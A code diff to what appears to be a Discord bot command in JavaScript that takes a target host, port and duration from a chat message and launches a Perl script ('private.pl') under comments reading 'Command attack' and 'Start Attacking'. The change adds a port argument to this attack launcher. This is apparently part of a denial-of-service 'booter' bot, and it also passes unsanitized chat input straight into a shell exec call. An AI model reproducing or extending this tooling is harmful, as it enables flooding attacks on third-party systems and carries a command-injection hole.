@@ -7,7 +7,8 @@ exports.run = async (client, message, args) => {
 
 const host = message.content.split (" ")[1]
 const time = message.content.split (" ")[2]
-const api = message.content.split (" ")[3]
+const port = message.content.split (" ")[3]
+const api = message.content.split (" ")[4]
 const ayarlar = require('../ayarlar.json');
 var room = ayarlar.commandroom;
 
@@ -68,7 +69,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`perl private.pl ${host} ${time}`, (error, stdout, stderr) => {
+exec(`perl private.pl ${host} ${port} 800 ${time}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
